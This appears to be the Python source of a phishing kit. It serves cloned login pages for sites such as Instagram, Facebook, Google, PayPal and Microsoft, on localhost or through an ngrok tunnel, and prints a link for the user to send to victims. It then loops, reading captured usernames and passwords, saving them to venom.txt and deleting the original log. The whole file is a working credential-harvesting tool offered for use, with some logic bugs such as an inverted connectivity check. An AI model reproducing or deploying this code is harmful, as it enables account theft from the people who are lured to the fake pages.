from setup.colors import ran , r, c, y,lg , g , w
p = ran
from setup.sprint import sprint
from setup.banner import banner , clear , banner2
import random
import time

clear()
banner()

try:
    import requests
    import colorama
except ModuleNotFoundError:
    import os
    os.system("pip install colorama")
    os.system("pip install requests")


def command(str):
    os.system(str)

def error(str):
    print(f"{y}[{r}!{y}] {lg}{str}")

def internet_connection():
    try:
        req = requests.get("https://google.com")

        if req.status_code == 200:
            error("Internet connection not found!")
        else:
            error("Something went wrong!")
    except KeyboardInterrupt:
        error("Exiting...")
        exit(0)

internet_connection()

def mkdir():
    try:
        os.makedirs("cache")
    except FileExistsError:
        pass
    except Exception:
        error("Failed...")


mkdir()

def userDATA(site):
    while True:
        if  os.path.exists(f"cache/{site}/userlog.txt"):
            error("User data found! ")
            os.system(f"cat cache/{site}/userlog.txt")
            os.system(f"cat cache/{site}/userlog.txt >> venom.txt")
            error(f"{y}[{g}+{y}] {r} Username and password saved into venom.txt")
            os.system(f"rm -rf cache/{site}/userlog.txt")
        else:
            pass

def localHost(site):
    path = f"sites/{site}"
    des = "cache/"
    os.system(f"cp -R {path} {des}")
    print("\n")
    print(f"{r}[{w}~{r}] {g} Select any\n ")
    print(f"{y}[{g}01{y}] {r} Localhost--Random--")
    print(f"{y}[{g}02{y}] {r} Localhost--Custom--")
    port_ = random.randint(1150, 9999)
    l_optn = input(f"{y}[{g}~{y}] {w} Choose option: ")
    if l_optn == "1" or l_optn == "01":
        os.system(f"php -S 127.0.0.1:{port_} -t cache/{site} > /dev/null 2>&1 & sleep 2")
        print(f"{r}[{w}+{r}] {g} Localhost started on http://127.0.0.1:{port_}")
        userDATA(site)
    elif l_optn == "2" or l_optn == "02":
        print()
        port_ = int(input(f"{r}[{g}+{r}] {y} Enter a portnumber: "))
        os.system(f"php -S 127.0.0.1:{port_} -t cache/{site} > /dev/null 2>&1 & sleep 2")
        print(f"{r}[{w}+{r}] {g} Localhost started on http://127.0.0.1:{port_}")
        userDATA(site)
    else:
        error("Invalid option")
        exit(0)

def ngrok(site):
    try:
        path = f"sites/{site}"
        des = "cache/"
        os.system(f"cp -R {path} {des}")
        sprint("\n")
        port_ = random.randint(1150, 9999)
        os.system(f"php -S 127.0.0.1:{port_} -t cache/{site} > /dev/null 2>&1 & sleep 2")
        os.system(f"./ngrok http http://127.0.0.1:{port_} > /dev/null 2>&1 & sleep 8")
        os.system(f'echo -ne "Send this link: "')
        os.system(f'curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io"')
        userDATA(site)
    except:
        print()
        error("Exiting........")

        time.sleep(2)
        exit(1)

def hostOption(site):
    print("\n")
    print(f"{p}[{g}~{p}] {w} Link generating option")
    print()
    print(f"{w}[{y}01{w}] {g} Localhost")
    print(f"{w}[{y}02{w}] {g} Ngrok")
    print()
    h_optn = input(f"{r}[{w}×{r}] {y} Choose option: ")
    if h_optn == "1" or h_optn == "01":
        localHost(site)
    elif h_optn == "2" or h_optn == "02":
        ngrok(site)

def menu():
    print(f"{y}[{g}01{y}] {c} Instagram     {y}[{g}11{y}] {c} Dropbox ")
    print(f"{y}[{g}02{y}] {c} Facebook      {y}[{g}12{y}] {c} ig_follower ")
    print(f"{y}[{g}03{y}] {c} Google        {y}[{g}13{y}] {c} Yandex ")
    print(f"{y}[{g}04{y}] {c} Twitter       {y}[{g}14{y}] {c} Origin ")
    print(f"{y}[{g}05{y}] {c} Netflix       {y}[{g}15{y}] {c} Ebay  ")
    print(f"{y}[{g}06{y}] {c} Snapchat      {y}[{g}16{y}] {c} Pinetrest ")
    print(f"{y}[{g}07{y}] {c} Yahoo         {y}[{g}17{y}] {c} Linkdin ")
    print(f"{y}[{g}08{y}] {c} Github        {y}[{g}18{y}] {c} Ebay ")
    print(f"{y}[{g}09{y}] {c} Paypal        {y}[{g}19{y}] {c} Microsoft  ")
    print(f"{y}[{g}10{y}] {c} Spotify       {y}[{g}20{y}] {c} About me ")
menu()
print("\n")

try:
    optn = input(f"{w}[{g}×{w}] {p} Choose an option: ")
except KeyboardInterrupt:
    error("Keyboard interrupt")
    time.sleep(1)
    exit()
if optn == '1' or optn == '01':
    hostOption("instagram")
elif optn == '2' or optn == '02':
    hostOption("facebook")
elif optn == '3' or optn == '03':
    hostOption("google")
elif optn == '4' or optn == '04':
    hostOption("twitter")
elif optn == '5' or optn == '05':
    hostOption("netflix")
elif optn == '6' or optn == '06':
    hostOption("snapchat")
elif optn == '7' or optn == '07':
    hostOption("yahoo")
elif optn == '8' or optn == '08':
    hostOption("github")
elif optn == '9' or optn == '09':
    hostOption("paypal")
elif optn == '10':
    hostOption("spotify")
elif optn == '11':
    hostOption("dropbox")
elif optn == '12':
    hostOption("ig_follower")
elif optn == '13':
    hostOption("yandex")
elif optn == '14':
    hostOption("origin")
elif optn == '15':
    hostOption("ebay")
elif optn == '16':
    hostOption("pinetrest")
elif optn == '17':
    hostOption("linkedin")
elif optn == '18':
    hostOption("snapchat")
elif optn == '19':
    hostOption("microsoft")
elif optn == '20':
    print(f"{y} I am Saad :-) \n{r}{c} Instagram : https://instagram.com/saadkhan041\n{p} Github : https://github.com/Saadkhan041")
else:
    print("\n")
    error("Invalid option selected SUCCESSFULLY")
    time.sleep(1)

    exit()
    banner2()


